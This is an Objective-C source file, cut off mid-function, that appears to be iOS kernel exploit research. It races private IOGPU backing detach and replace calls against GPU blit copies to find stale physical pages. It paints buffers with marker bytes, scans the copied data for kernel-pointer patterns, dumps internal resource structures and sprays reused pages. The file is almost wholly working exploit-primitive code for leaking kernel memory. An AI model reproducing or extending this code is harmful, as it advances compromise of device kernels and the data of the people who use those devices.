#import "P011WireRaceProbe.h"
#import <Metal/Metal.h>
#import <dlfcn.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdarg.h>
#import <stdio.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <mach/thread_policy.h>
#import <mach/thread_act.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <strings.h>
#import <stdlib.h>
#import <sys/mman.h>
#import <CoreFoundation/CoreFoundation.h>

#define P011_N          2000
#define P011_TIME_SEC   25.0
#define P011_FILL_OLD   0x41
#define P011_FILL_STG   0x11
#define P011_FILL_NEW   0x43

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfCreate_t)(CFDictionaryRef);
typedef kern_return_t (*IOSurfLock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef kern_return_t (*IOSurfUnlock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef void *(*IOSurfBase_t)(IOSurfaceRef);
typedef int (*P011Detach_t)(void *);
typedef int (*P011Replace_t)(void *, void *, uint64_t);
typedef uint32_t (*P011GetType_t)(void *);
typedef uint64_t (*P011GetU64_t)(void *);

static NSMutableString *p011_buf;
static int p011_fd = -1;

static void p011_log(const char *fmt, ...) {
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int)sizeof(lb) - 2) n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (p011_buf) [p011_buf appendFormat:@"%.*s", n, lb];
        if (p011_fd >= 0) {
            write(p011_fd, lb, (size_t)n);
            fcntl(p011_fd, F_FULLFSYNC);
        }
    }
}

static id<MTLDevice> g_dev;
static id<MTLCommandQueue> g_q;
static id<MTLBuffer> g_buf, g_stage;
static void *g_ref;
static P011Detach_t g_detach;
static P011Replace_t g_repl;
static void *g_data;
static uint64_t g_len;
static IOSurfaceRef g_surf;
static atomic_int g_stop;
static atomic_ulong g_commits, g_det_ok, g_det_fail, g_rep_ok, g_rep_fail, g_phys_hits;

static NSString *p011_finish(void) {
    free(g_data); g_data = NULL;
    g_buf = nil; g_stage = nil; g_q = nil; g_dev = nil; g_ref = NULL;
    if (g_surf) { CFRelease(g_surf); g_surf = NULL; }
    if (p011_fd >= 0) { fcntl(p011_fd, F_FULLFSYNC); close(p011_fd); p011_fd = -1; }
    return p011_buf ?: @"STOP: no log";
}

static id p011_unwrap(id buf) {
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s]) break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf) break;
        buf = b;
    }
    return buf;
}

static void *p011_ref(id buf) {
    buf = p011_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

/* Wirer: GPU read of the raced resource into staging. Isolated wait is
 * done on the racer side after replace — this thread only submits. */
static void *p011_wirer(void *u) {
    (void)u;
    NSUInteger L = MIN(g_buf.length, g_stage.length);
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            id<MTLCommandBuffer> cb = [g_q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromBuffer:g_buf sourceOffset:0
                     toBuffer:g_stage destinationOffset:0 size:L];
            [e endEncoding];
            [cb commit];
            atomic_fetch_add(&g_commits, 1);
        }
    }
    return NULL;
}

static void p011_classify(const uint8_t *s, size_t n, int *n11, int *n41, int *n43, int *n00, int *nfor, uint8_t *first_for) {
    *n11 = *n41 = *n43 = *n00 = *nfor = 0;
    *first_for = 0;
    for (size_t i = 0; i < n; i++) {
        uint8_t b = s[i];
        if (b == P011_FILL_STG) (*n11)++;
        else if (b == P011_FILL_OLD) (*n41)++;
        else if (b == P011_FILL_NEW) (*n43)++;
        else if (b == 0x00) (*n00)++;
        else {
            if (*nfor == 0) *first_for = b;
            (*nfor)++;
        }
    }
}

@implementation P011WireRaceProbe

+ (NSString *)runWireReplaceRace {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_wire_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== P011 v3 / T020: GPU DMA read of raced backing ===");
    p011_log("[*] A14 26.5 oracle: GART PFN copy vs replace complete/unpin");
    p011_log("[*] order: detach-until-idle, 200us, replace vs next prepare");
    p011_log("[*] blit: copyFromBuffer target -> staging");
    p011_log("[*] paints: target=0x41 staging=0x11 replace-new=0x43");
    p011_log("[*] FOREIGN = byte not in {0x41,0x11,0x43,0x00} — not a proven kernel object");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iogpu || !iosH) { p011_log("STOP dlopen"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    IOSurfCreate_t pCreate = (IOSurfCreate_t)dlsym(iosH, "IOSurfaceCreate");
    IOSurfLock_t pLock = (IOSurfLock_t)dlsym(iosH, "IOSurfaceLock");
    IOSurfUnlock_t pUnlock = (IOSurfUnlock_t)dlsym(iosH, "IOSurfaceUnlock");
    IOSurfBase_t pBase = (IOSurfBase_t)dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!g_detach || !g_repl || !pCreate) { p011_log("STOP syms"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    p011_log("\n--- Stage 0: calibrate (any type that detaches) ---");

    /* type 0x00 Shared — expected 0xe00002bc (bit7 gate) */
    {
        id tb = [g_dev newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
        void *tr = p011_ref(tb);
        uint32_t t = (tr && getType) ? getType(tr) : 0;
        int dk = (tr && g_detach) ? g_detach(tr) : -1;
        p011_log("[0] Shared 4K type=0x%x class=%s detach=0x%08x",
                 t, tb ? [NSStringFromClass([p011_unwrap(tb) class]) UTF8String] : "nil", dk);
    }

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    g_surf = pCreate((__bridge CFDictionaryRef)props);
    if (!g_surf) { p011_log("STOP IOSurfaceCreate"); return p011_finish(); }

    SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
    if (![g_dev respondsToSelector:nbSel]) { p011_log("STOP no newBufferWithIOSurface:"); return p011_finish(); }
    g_buf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(g_dev, nbSel, g_surf);
    g_ref = p011_ref(g_buf);
    if (!g_buf || !g_ref) { p011_log("STOP iosurf buffer/ref"); return p011_finish(); }

    uint32_t typ = getType ? getType(g_ref) : 0;
    uint64_t gvaLen = getLen ? getLen(g_ref) : 0;
    p011_log("[0] iosurf buf=%p ref=%p type=0x%x GVALen=0x%llx class=%s",
             g_buf, g_ref, typ, gvaLen,
             [NSStringFromClass([p011_unwrap(g_buf) class]) UTF8String]);

    /* Paint the surface 0x41 through IOSurface — [MTLBuffer contents] is
     * often NULL on 0x82, so a CPU fill of the Metal buffer never happens. */
    size_t slen = 64 * 64 * 4;
    if (pLock && pBase && pUnlock && pLock(g_surf, 0, NULL) == KERN_SUCCESS) {
        uint8_t *base = pBase(g_surf);
        if (base) {
            memset(base, P011_FILL_OLD, slen);
            p011_log("[0] painted IOSurface 0x41 via Lock/Base (%zu bytes)", slen);
        } else {
            p011_log("[0] IOSurfaceGetBaseAddress=NULL — 0x41 paint skipped");
        }
        pUnlock(g_surf, 0, NULL);
    } else {
        p011_log("[0] IOSurfaceLock failed — 0x41 paint skipped");
    }
    void *cpu = [g_buf contents];
    if (cpu) {
        memset(cpu, P011_FILL_OLD, MIN((size_t)g_buf.length, slen));
        p011_log("[0] also painted MTL contents 0x41");
    }

    g_len = gvaLen ? gvaLen : slen;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    int dkr = g_detach(g_ref);
    p011_log("[0] detach -> 0x%08x", dkr);
    if (dkr != 0) {
        p011_log("STOP detach failed (type 0x%x) — bit7 gate or still prepared", typ);
        return p011_finish();
    }
    int rkr = g_repl(g_ref, g_data, g_len);
    p011_log("[0] replace(0x%llx) -> 0x%08x", g_len, rkr);
    if (rkr != 0) {
        uint64_t cands[] = { slen, 0x10000, 0x20000 };
        for (int i = 0; i < 3 && rkr != 0; i++) {
            if (!cands[i] || cands[i] == g_len) continue;
            void *tmp = realloc(g_data, (size_t)cands[i]);
            if (!tmp) continue;
            g_data = tmp;
            memset(g_data, P011_FILL_NEW, (size_t)cands[i]);
            g_detach(g_ref);
            rkr = g_repl(g_ref, g_data, cands[i]);
            p011_log("[0] replace(0x%llx) -> 0x%08x", cands[i], rkr);
            if (rkr == 0) g_len = cands[i];
        }
    }
    if (rkr != 0) { p011_log("STOP replace failed"); return p011_finish(); }
    p011_log("[0] working size = 0x%llx", g_len);

    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!g_stage) { p011_log("STOP no staging"); return p011_finish(); }
    memset([g_stage contents], P011_FILL_STG, (size_t)g_len);

    int sd = g_detach(g_ref), sr = g_repl(g_ref, g_data, g_len);
    p011_log("[0] smoke detach=0x%08x replace=0x%08x", sd, sr);
    if (sd != 0 || sr != 0) { p011_log("STOP smoke failed"); return p011_finish(); }

    /* After smoke replace, backing is 0x43. Re-paint 0x41 on the NEW pages
     * so a later copy of still-alive object memory is 0x41, not leftover 0x43. */
    if (pLock && pBase && pUnlock && pLock(g_surf, 0, NULL) == KERN_SUCCESS) {
        uint8_t *base = pBase(g_surf);
        if (base) memset(base, P011_FILL_OLD, slen);
        pUnlock(g_surf, 0, NULL);
    }
    if ([g_buf contents]) memset([g_buf contents], P011_FILL_OLD, MIN((size_t)g_buf.length, (size_t)g_len));

    p011_log("\n--- Stage 1: re-ordered race ---");
    p011_log("[*] detach-until-idle, 200us, replace, 5ms, classify staging");
    atomic_store(&g_stop, 0);
    pthread_t wt;
    if (pthread_create(&wt, NULL, p011_wirer, NULL) != 0) {
        p011_log("STOP pthread");
        return p011_finish();
    }
    usleep(50000);

    NSDate *t0 = [NSDate date];
    for (int iter = 0; iter < P011_N && -[t0 timeIntervalSinceNow] < P011_TIME_SEC; iter++) {
        int dk = -1;
        for (int tries = 0; tries < 20; tries++) {
            dk = g_detach(g_ref);
            if (dk == 0) break;
            atomic_fetch_add(&g_det_fail, 1);
            usleep(100);
        }
        if (dk != 0) {
            if (atomic_load(&g_det_fail) <= 4)
                p011_log("[race] detach fail 0x%08x iter=%d", dk, iter);
            continue;
        }
        atomic_fetch_add(&g_det_ok, 1);
        usleep(200);
        int rk = g_repl(g_ref, g_data, g_len);
        if (rk != 0) {
            atomic_fetch_add(&g_rep_fail, 1);
            continue;
        }
        unsigned long ok = atomic_fetch_add(&g_rep_ok, 1) + 1;
        usleep(5000);

        uint8_t *s = (uint8_t *)[g_stage contents];
        if (!s) continue;
        int n11, n41, n43, n00, nfor;
        uint8_t ff;
        size_t scan = MIN((size_t)g_len, (size_t)4096);
        p011_classify(s, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        if (nfor > 0) {
            atomic_fetch_add(&g_phys_hits, 1);
            p011_log("[*** FOREIGN iter=%d first=0x%02x nfor=%d n41=%d n43=%d n11=%d n00=%d ***]",
                     iter, ff, nfor, n41, n43, n11, n00);
        }
        if ((ok % 200) == 0)
            p011_log("[race] rep=%lu det_fail=%lu commits=%lu foreign=%lu (41=%d 43=%d 11=%d)",
                     ok, atomic_load(&g_det_fail), atomic_load(&g_commits),
                     atomic_load(&g_phys_hits), n41, n43, n11);
        memset(s, P011_FILL_STG, scan);
    }

    atomic_store(&g_stop, 1);
    pthread_join(wt, NULL);

    p011_log("\n[*] done: det_ok=%lu det_fail=%lu rep_ok=%lu rep_fail=%lu commits=%lu foreign=%lu",
             atomic_load(&g_det_ok), atomic_load(&g_det_fail),
             atomic_load(&g_rep_ok), atomic_load(&g_rep_fail),
             atomic_load(&g_commits), atomic_load(&g_phys_hits));
    if (atomic_load(&g_phys_hits) > 0)
        p011_log("=== verdict: FOREIGN staging bytes (%lu) — GPU copied pages that were not 0x41/0x11/0x43/0x00. Not a proven kernel object. ===",
                 atomic_load(&g_phys_hits));
    else if (atomic_load(&g_rep_ok) == 0)
        p011_log("=== verdict: INCONCLUSIVE — replace never succeeded ===");
    else
        p011_log("=== verdict: SURVIVED %lu replaces, 0 foreign — new/old paints only, or pages still owned by MD _memRef ===",
                 atomic_load(&g_rep_ok));
    return p011_finish();
}

+ (NSString *)runIdleBlitReplace {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v4_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== P011 v4 / T020: idle-wait then in-flight replace ===");
    p011_log("[*] A14 26.5: if v3 panics 'still prepared', this is the re-order");
    p011_log("[*] no background wirer. A=idle detach+replace. B=blit+wait+detach+replace.");
    p011_log("[*] C=detach then blit-no-wait then replace (still-prepared?). N=8");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iogpu || !iosH) { p011_log("STOP dlopen"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    IOSurfCreate_t pCreate = (IOSurfCreate_t)dlsym(iosH, "IOSurfaceCreate");
    IOSurfLock_t pLock = (IOSurfLock_t)dlsym(iosH, "IOSurfaceLock");
    IOSurfUnlock_t pUnlock = (IOSurfUnlock_t)dlsym(iosH, "IOSurfaceUnlock");
    IOSurfBase_t pBase = (IOSurfBase_t)dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!g_detach || !g_repl || !pCreate) { p011_log("STOP syms"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    g_surf = pCreate((__bridge CFDictionaryRef)props);
    if (!g_surf) { p011_log("STOP IOSurfaceCreate"); return p011_finish(); }
    SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
    if (![g_dev respondsToSelector:nbSel]) { p011_log("STOP no newBufferWithIOSurface:"); return p011_finish(); }
    g_buf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(g_dev, nbSel, g_surf);
    g_ref = p011_ref(g_buf);
    if (!g_buf || !g_ref) { p011_log("STOP iosurf buffer/ref"); return p011_finish(); }

    uint32_t typ = getType ? getType(g_ref) : 0;
    uint64_t gvaLen = getLen ? getLen(g_ref) : 0;
    size_t slen = 64 * 64 * 4;
    p011_log("[0] type=0x%x GVALen=0x%llx class=%s", typ, gvaLen,
             [NSStringFromClass([p011_unwrap(g_buf) class]) UTF8String]);

    if (pLock && pBase && pUnlock && pLock(g_surf, 0, NULL) == KERN_SUCCESS) {
        uint8_t *base = pBase(g_surf);
        if (base) memset(base, P011_FILL_OLD, slen);
        pUnlock(g_surf, 0, NULL);
    }
    g_len = gvaLen ? gvaLen : slen;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!g_stage) { p011_log("STOP no staging"); return p011_finish(); }
    memset([g_stage contents], P011_FILL_STG, (size_t)g_len);

    p011_log("\n--- A: idle detach + replace (no GPU) ---");
    int da = g_detach(g_ref);
    int ra = g_repl(g_ref, g_data, g_len);
    p011_log("[A] detach=0x%08x replace=0x%08x", da, ra);
    if (da != 0 || ra != 0) {
        p011_log("STOP A failed — do not run C");
        return p011_finish();
    }

    p011_log("\n--- B: one blit, waitUntilCompleted, then detach+replace ---");
    {
        id<MTLCommandBuffer> cb = [g_q commandBuffer];
        id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
        [e copyFromBuffer:g_buf sourceOffset:0
                 toBuffer:g_stage destinationOffset:0
                     size:MIN(g_buf.length, g_stage.length)];
        [e endEncoding];
        [cb commit];
        [cb waitUntilCompleted];
        p011_log("[B] blit status=%ld", (long)[cb status]);
        int db = g_detach(g_ref);
        int rb = g_repl(g_ref, g_data, g_len);
        p011_log("[B] after wait: detach=0x%08x replace=0x%08x", db, rb);
        if (db != 0 || rb != 0) {
            p011_log("=== verdict B: waitUntilCompleted did NOT drop prepared (0x%08x/0x%08x) ===", db, rb);
            return p011_finish();
        }
    }

    p011_log("\n--- C: detach, commit blit (no wait), replace immediately ---");
    p011_log("[C] still-prepared panic lives here if GPU prepare races replace");
    int c_ok = 0, c_dfail = 0, c_rfail = 0;
    for (int i = 0; i < 8; i++) {
        int dc = g_detach(g_ref);
        p011_log("[C] iter=%d detach=0x%08x (next line missing = panic on blit/replace)", i, dc);
        if (dc != 0) { c_dfail++; continue; }
        id<MTLCommandBuffer> cb = [g_q commandBuffer];
        id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
        [e copyFromBuffer:g_buf sourceOffset:0
                 toBuffer:g_stage destinationOffset:0
                     size:MIN(g_buf.length, g_stage.length)];
        [e endEncoding];
        [cb commit];
        int rc = g_repl(g_ref, g_data, g_len);
        [cb waitUntilCompleted];
        p011_log("[C]   replace=0x%08x blit=%ld", rc, (long)[cb status]);
        if (rc == 0) c_ok++;
        else c_rfail++;
    }
    p011_log("=== verdict C: SURVIVED 8  detach_fail=%d replace_ok=%d replace_fail=%d ===",
             c_dfail, c_ok, c_rfail);
    p011_log("[*] still-prepared panic would have died mid-C (no verdict line).");
    return p011_finish();
}

#define P011_FILL_REUSE  0xEE

static int p011_scan_kptr(const uint8_t *s, size_t n, uint64_t *first) {
    int hits = 0;
    *first = 0;
    size_t lim = n & ~(size_t)7;
    for (size_t i = 0; i + 8 <= lim; i += 8) {
        uint64_t q;
        memcpy(&q, s + i, 8);
        if ((q >> 36) == 0xFFFFFFF0ULL || (q >> 40) == 0xFFFFFEULL) {
            if (hits == 0) *first = q;
            hits++;
        }
    }
    return hits;
}

static const char *p011_kr(kern_return_t r) {
    unsigned u = (unsigned)r;
    if (r == 0) return "SUCCESS";
    if (u == 0xe00002c2) return "BadArgument";
    if (u == 0xe00002be) return "NoResources";
    if (u == 0xe00002bc) return "Error";
    if (u == 0xe00002c7) return "Unsupported";
    if (u == 0xe00002c1) return "Aborted";
    if (u == 0xe00002e2) return "NotPermitted";
    if (u == 0xe00002d8) return "NotOpen";
    if (u == 0xe00002c9) return "NotAttached";
    if (u == 0xe00002cd) return "NotReadable";
    if (u == 0xe00002cc) return "NotWritable";
    if (u == 0xe00002d1) return "Offline";
    if (u == 0x10000003) return "INVALID_DEST";
    if (u == 1) return "one";
    return "?";
}

static void *p011_ivar(id obj, const char *name) {
    if (!obj || !name) return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val) return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p011_strip(void *p) {
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

/* Heap/CF object, not a thread stack (0x16xxxxxxxx) and not PAC residue. */
static int p011_is_heap(void *p) {
    uintptr_t x = (uintptr_t)p011_strip(p);
    if (x < 0x100000000ULL) return 0;
    if ((x & 7) != 0) return 0;
    if ((x >> 28) == 0x16) return 0;
    return 1;
}

static uint32_t p011_res_id(void *res) {
    if (!res) return 0;
    return *(uint32_t *)((uint8_t *)res + 0x30);
}

static uint32_t p011_res_conn(void *res) {
    if (!res) return 0;
    void *devw = p011_strip(*(void **)((uint8_t *)res + 0x10));
    if (!p011_is_heap(devw)) return 0;
    return *(uint32_t *)((uint8_t *)devw + 0x14);
}

static void p011_dump_res(const char *tag, void *res) {
    if (!res) {
        p011_log("%s res=NULL", tag);
        return;
    }
    uint8_t *r = (uint8_t *)res;
    uint64_t w10 = *(uint64_t *)(r + 0x10);
    uint64_t w30 = *(uint64_t *)(r + 0x30);
    uint64_t w38 = *(uint64_t *)(r + 0x38);
    uint64_t w48 = *(uint64_t *)(r + 0x48);
    uint32_t rid = (uint32_t)w30;
    uint8_t tb = (uint8_t)(w30 >> 32);
    p011_log("%s res=%p raw+0x10=0x%llx +0x30=0x%llx id=%u +0x34=0x%02x bit7=%d +0x38=0x%llx +0x48=0x%llx",
             tag, res, (unsigned long long)w10, (unsigned long long)w30,
             rid, tb, (tb >> 7) & 1,
             (unsigned long long)w38, (unsigned long long)w48);
}

+ (NSString *)runDropBackingPhysOracle {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v5_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== T020 v5b: attached blit, then drop backing ===");
    p011_log("[*] v5 OOM: QueueCreate x32 during in-flight blit (Code=8). Removed.");
    p011_log("[*] order: paint 0x41 ATTACHED, blit-no-wait, detach+replace 0x43,");
    p011_log("[*]         CFRelease extra surface ref, 16K 0xEE pages, wait.");
    p011_log("[*] Keep MTLBuffer until wait. No GPU QueueCreate occupancy.");
    p011_log("[*] 0xEE = our reuse. kptr = kernel reuse. 0x43 = new MD. 0x41 = old pages.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iogpu || !iosH) { p011_log("STOP dlopen"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    IOSurfCreate_t pCreate = (IOSurfCreate_t)dlsym(iosH, "IOSurfaceCreate");
    IOSurfLock_t pLock = (IOSurfLock_t)dlsym(iosH, "IOSurfaceLock");
    IOSurfUnlock_t pUnlock = (IOSurfUnlock_t)dlsym(iosH, "IOSurfaceUnlock");
    IOSurfBase_t pBase = (IOSurfBase_t)dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!g_detach || !g_repl || !pCreate) { p011_log("STOP syms"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    g_surf = pCreate((__bridge CFDictionaryRef)props);
    if (!g_surf) { p011_log("STOP IOSurfaceCreate"); return p011_finish(); }
    SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
    if (![g_dev respondsToSelector:nbSel]) { p011_log("STOP no newBufferWithIOSurface:"); return p011_finish(); }
    g_buf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(g_dev, nbSel, g_surf);
    g_ref = p011_ref(g_buf);
    if (!g_buf || !g_ref) { p011_log("STOP iosurf buffer/ref"); return p011_finish(); }

    uint32_t typ = getType ? getType(g_ref) : 0;
    uint64_t gvaLen = getLen ? getLen(g_ref) : 0;
    size_t slen = 64 * 64 * 4;
    p011_log("[0] type=0x%x GVALen=0x%llx slen=0x%zx class=%s",
             typ, gvaLen, slen,
             [NSStringFromClass([p011_unwrap(g_buf) class]) UTF8String]);

    if (pLock && pBase && pUnlock && pLock(g_surf, 0, NULL) == KERN_SUCCESS) {
        uint8_t *base = pBase(g_surf);
        if (base) memset(base, P011_FILL_OLD, slen);
        pUnlock(g_surf, 0, NULL);
        p011_log("[0] painted IOSurface 0x41");
    }

    g_len = gvaLen ? gvaLen : slen;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!g_stage) { p011_log("STOP no staging"); return p011_finish(); }
    memset([g_stage contents], P011_FILL_STG, (size_t)g_len);

    p011_log("\n--- blit ATTACHED, then detach+replace+drop extra surface ---");
    id<MTLCommandBuffer> cb = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    [enc copyFromBuffer:g_buf sourceOffset:0
               toBuffer:g_stage destinationOffset:0
                   size:MIN(g_buf.length, g_stage.length)];
    [enc endEncoding];
    [cb commit];
    p011_log("[1] blit committed while IOSurface still attached");
    fcntl(p011_fd, F_FULLFSYNC);

    int d0 = g_detach(g_ref);
    p011_log("[2] detach=0x%08x (next missing = still-prepared panic)", d0);
    fcntl(p011_fd, F_FULLFSYNC);
    int rk = -1;
    if (d0 == 0) {
        rk = g_repl(g_ref, g_data, g_len);
        p011_log("[3] replace(0x%llx)=0x%08x", g_len, rk);
    } else {
        p011_log("[3] skip replace (detach failed)");
    }

    if (g_surf) {
        CFRelease(g_surf);
        g_surf = NULL;
        p011_log("[4] CFRelease extra IOSurface ref (MTLBuffer kept until wait)");
    }

    const int nreuse = 8;
    vm_address_t reuse_base = 0;
    vm_size_t reuse_len = (vm_size_t)nreuse * 0x4000;
    kern_return_t vak = vm_allocate(mach_task_self(), &reuse_base, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("[5] vm_allocate 8x16K 0xEE -> 0x%08x base=0x%llx",
             (unsigned)vak, (unsigned long long)reuse_base);
    if (vak == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse_base, P011_FILL_REUSE, (size_t)reuse_len);

    [cb waitUntilCompleted];
    {
        NSInteger st = [cb status];
        NSError *err = [cb error];
